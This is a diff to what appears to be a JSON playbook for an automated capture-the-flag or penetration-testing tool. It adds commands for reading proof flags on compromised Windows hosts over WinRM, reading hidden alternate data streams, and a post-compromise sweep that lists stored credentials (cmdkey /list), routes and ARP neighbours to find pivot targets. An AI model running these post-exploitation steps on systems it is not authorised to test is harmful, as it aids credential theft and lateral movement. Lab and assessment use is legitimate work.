+          "web_note": "COMBINED USER + ROOT PROOF READ (Inside your on-host shell): Prints whoami, hostname, ipconfig, and both {{flag_path_local}} and {{flag_path_root}} in one command."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
+          "win": true,
+          "run": "whoami; hostname; ipconfig; type {{flag_path_root}}",
+          "note": "ON THE HOST as SYSTEM/Administrator (PowerShell / Evil-WinRM), capture the ROOT/proof flag with its identity in the same frame (whoami + hostname + ipconfig + the flag) for the report."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "alt": true,
           "run": "dir /r C:\\Users\\Administrator\\Desktop",
           "settled_by": [
             "objective.flag_located"
@@ -395,6 +749,8 @@
         {
           "tool": "powershell",
           "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
           "settled_by": [
             "objective.flag_located"
           ],
@@ -404,6 +760,11 @@
         {
           "tool": "powershell",
           "locus": "onhost",
+          "alt": true,
+          "requires_port": 5985,
+          "settled_by": [
+            "objective.flag_located"
+          ],
           "run": "Get-Content 'C:\\Users\\Administrator\\Desktop\\{{filename}}' -Stream '{{stream_name}}'",
           "note": "POWERSHELL ADS READ: Reads the contents of a hidden alternate data stream flag (e.g. -Stream root.txt)."
         },
@@ -425,6 +786,62 @@
       "deprioritize_when": [
         "objective.root_flag"
       ]
+    },
+    {
+      "id": "post-proof-loot-sweep",
+      "title": "Post-Proof Credential & Subnet Pivot Sweep",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "cmd"
+      ],
+      "priority": 75,
+      "phase": "loot",
+      "requires_all": [],
+      "requires_any": [
+        "proof.captured",
+        "objective.root_flag"
+      ],
+      "os": [
+        "linux",
+        "windows"
+      ],
+      "produces": [
+        "credential.candidate",
+        "scan.local.routes",
+        "scan.local.neighbors"
+      ],
+      "settled_by": [
+        "credential.candidate",
+        "scan.local.routes",
+        "scan.local.neighbors"
+      ],
+      "deprioritize_when": [
+        "scan.local.routes",
+        "scan.local.neighbors"
+      ],
+      "hypothesis": "Capturing the proof flag is not the end of a multi-host environment: an owned host often holds dual-homed interfaces, ARP neighbors on an internal subnet, or stored credentials that unlock the next machine in the lab.",
+      "proves": "internal network routes, ARP neighbors, and stored host credentials from the compromised machine after proof capture",
+      "does_not_prove": "reachability or compromise of adjacent internal hosts until a pivot or lateral login succeeds",
+      "report": {
+        "finding": "Post-Compromise Network & Credential Loot Sweep",
+        "severity": "info"
+      },
+      "commands": [
+        {
+          "tool": "sh",
+          "locus": "onhost",
+          "run": "ip -br addr; ip route; ip neigh; cat /etc/hosts /etc/resolv.conf 2>/dev/null",
+          "note": "Linux post-proof sweep: enumerate all NICs, kernel routes, ARP neighbors, and static host/DNS entries for internal pivot targets."
+        },
+        {
+          "tool": "cmd",
+          "locus": "onhost",
+          "run": "ipconfig /all & route print & arp -a & cmdkey /list",
+          "note": "Windows post-proof sweep: enumerate all adapters, routing tables, ARP cache entries, and stored Credential Manager entries."
+        }
+      ]
     }
-  ]
+  ],
+  "id": "obol_flag_hunt_2026_09"
 }
